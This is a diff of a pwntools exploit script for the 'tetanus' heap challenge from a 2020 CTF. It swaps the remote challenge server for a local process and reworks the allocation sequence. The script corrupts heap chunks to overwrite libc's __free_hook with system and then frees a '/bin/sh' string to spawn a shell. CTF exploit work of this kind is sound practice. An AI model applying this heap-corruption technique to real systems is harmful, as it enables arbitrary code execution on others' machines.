@@ -5,8 +5,8 @@ pwn, 492
 from pwn import *
 
 
-p = remote("2020.redpwnc.tf", 31069)
-#p = process("./tetanus")
+#p = remote("2020.redpwnc.tf", 31069)
+p = process("./tetanus")
 e = ELF("./tetanus")
 libc = ELF("./libc.so.6")
 
@@ -85,21 +85,20 @@ append(1, 0x4141)
 free(2)
 free(1)
 edit(1, 0, libc.sym["__free_hook"])
-free(2)
 
-alloc(0x69) 	# c3
-alloc(0x69)	# c4
-alloc(0x69)	# c5, this the chunk w/ pointer to where we want to write
+alloc(0x69)	# c3
+alloc(0x69)	# c4, this the chunk w/ pointer to where we want to write
 
 
 # -- This one spawns a shell for you by calling __free_hook with /bin/sh as the memory being freed --
-append(5, libc.sym["system"])
+#append(4, libc.sym["system"])
+
 alloc(0x10)
-append(6, u64("/bin/sh;"))
-free(6)
+append(5, u64("/bin/sh;"))
+free(5)
 
 # -- This one spawns a shell for you by utilizing the fact that rust mallocs and frees input, which in this case is the string "/bin/sh" --
-#append(5, libc.sym["system"])
+#append(4, libc.sym["system"])
 #p.recvuntil("> ")
 #p.sendline("/bin/sh")
 
